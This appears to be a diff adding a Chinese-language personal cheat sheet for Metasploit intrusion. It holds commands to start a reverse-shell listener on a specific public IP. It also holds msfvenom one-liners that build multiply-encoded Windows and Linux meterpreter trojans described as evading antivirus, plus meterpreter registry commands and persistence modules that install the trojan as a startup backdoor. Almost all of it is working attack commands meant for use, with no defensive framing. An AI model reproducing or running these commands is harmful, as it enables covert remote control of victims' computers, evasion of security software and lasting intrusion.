@@ -1,0 +1,42 @@
+快速开启监听
+msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 119.29.192.219;set LPORT 3333; exploit" 
+msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0;set LPORT 3333; exploit" 
+
+列出payload
+msfvenom -l | grep 'windows' | grep 'reverse_tcp' | grep 'meterpre'
+
+生成木马
+x86  --  需要进行多次编码，加壳才能免杀
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=119.29.192.219 LPORT=2333 -a x86 --platform windows -f raw | msfvenom -e x86/shikata_ga_nai -i 7 -a x86 --platform windows -f raw | msfvenom -e x86/alpha_upper -i 3 -a x86 --platform windows -f raw | msfvenom -e x86/alpha_upper -i 3 -a x86 --platform windows -f raw | msfvenom -e x86/alpha_upper -i 3 -a x86 --platform windows -f raw | msfvenom -e x86/shikata_ga_nai -i 6 -a x86 --platform windows -f raw| msfvenom -e x86/alpha_upper -i 3 -a x86 --platform windows -f exe >acn.exe
+
+x64  --  64位较隐蔽，不进行编码，加壳后也不会被查杀
+msfvenom -p windows/x64/meterpreter_reverse_tcp -i 5 -b '\x00' LHOST=119.29.192.219 LPORT=3333 -a x64 --platform windows -f exe >acn.exe
+
+linux
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=119.29.192.219 LPORT=3333 -f elf > shell.elf
+
+处理加壳错误
+strip -g acn.exe
+strip经常用来去除目标文件中的一些符号表、调试符号表信息，以减小程序的大小
+
+生成木马途径
+Python代码，连接C库，执行shellcode，打包成exe文件
+C代码，执行sheelcode，编译exe    -- http://www.evil0x.com/posts/9396.html
+
+持久性后门
+加入开机启动项 --  http://blog.csdn.net/cashey1991/article/details/6776349
+meter 注册表交互：
+    查询 reg enumkey -k HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run
+    查值 reg queryval -k HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\Run -v nc
+    插入：
+        reg setval -k HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\Users\pc2\Desktop\acn.exe'   --试验成功，和360在一个表项中
+        reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\Users\pc2\Desktop\acn.exe'
+        reg setval -k HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\Users\pc2\Desktop\acn.exe'
+    删除 reg deleteval -k HKCU\\software\\microsoft\\windows\\currentversion\\run -v IwYkCpOg
+
+免杀-持久  -- http://www.freebuf.com/sectool/118714.html
+    exploit/windows/local/registry_persistence    -- 试验成功  将payload插入注册表 然后将启动payload的powershell插入注册表开机启动项
+    exploit/windows/local/vss_persistence
+    exploit/windows/local/s4u_persistence
+    ...
+    powershell
